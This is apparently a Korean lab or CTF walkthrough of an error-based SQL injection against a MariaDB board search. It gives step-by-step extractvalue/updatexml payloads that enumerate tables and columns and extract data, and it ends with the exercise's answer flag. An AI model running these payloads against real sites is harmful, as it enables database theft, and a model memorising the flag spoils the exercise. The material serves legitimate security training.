1> 예상 쿼리문
select 번호,제목... from 게시판 where 제목 like '%_값_%'; 

2> 공격 포인트(에러 확인)
 '
 >> 문법 에러를 출력한다. --> mysql 에러가 발생하는 것을 확인(안보이면 burpsuite 체크해보기)
    등록된 게시물이 없습니다.
    error code : [1064] You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version 
    for the right syntax to use near '%' OR A.CONTENT like '%'%' OR U.USER_NM like '%'%' ) AND DATE_FORMAT(A.REG_DT ,' at line 17

3. Error-based 제약 사항  >> 개수 찾기 -> 1rows씩 확인
select 글번호,제목,... from 게시판 
where LOWER(제목) like '%a%' and  extractvalue('1', concat(0x3a,(select 'hacker')))='fa%

공격 구문1: a%' and  extractvalue('1', concat(0x3a,(_공격쿼리_)))='fa%
공격 구문2: a%' and updatexml(null,concat(0x3a,(_공격쿼리_)),null)='fa%

4. 테이블 명
    select table_name from INFORMATION_SCHEMA.tables where table_schema = database()
    4-1. 테이블 개수 확인: 7
        select count(table_name) 
        from INFORMATION_SCHEMA.tables 
        where table_schema=database()
        > a%' and  extractvalue('1', concat(0x3a,(select count(table_name) from INFORMATION_SCHEMA.tables where table_schema = database())))='fa%
        
        > a%' and updatexml(null,concat(0x3a,(select count(table_name) from INFORMATION_SCHEMA.tables where table_schema = database())),null)='fa%

    4-2. 테이블 명 확인: access_log, :comm_file, :comm_mdi_file, :eqst_answer, :member, :notice, :zipcode
        (원래 @rownum 사용하다가 실패하고 limit 사용)
        select table_name
        from information_schema.tables
        where table_schema=database() limit 0,1
        > a%' and  extractvalue('1', concat(0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))='fa%
        
        a%' and updatexml(null,concat(0x3a,(select 'hihi')),null)='fa%
        > a%' and updatexml(null,concat(0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),null)='fa%
5. 컬럼명
    select column_name from information_schema.columns where table_name='eqst_answer'
    5-1. 컬럼 개수 확인: 1
        select count(column_name)
        from information_schema.columns where table_name='eqst_answer'
        > a%' and  extractvalue('1', concat(0x3a,(select count(column_name) from information_schema.columns where table_name='eqst_answer')))='fa%

    5-2. 컬럼 명 확인: answer_column
    select column_name from information_schema.columns where table_name='eqst_answer'
    > a%' and  extractvalue('1', concat(0x3a,(select column_name from information_schema.columns where table_name='eqst_answer')))='fa%

6. 데이터 탈취
    select answer_column from eqst_answer
    > a%' and  extractvalue('1', concat(0x3a,(select answer_column from eqst_answer)))='fa%

[정답] skinfosec_eqst_lms_system
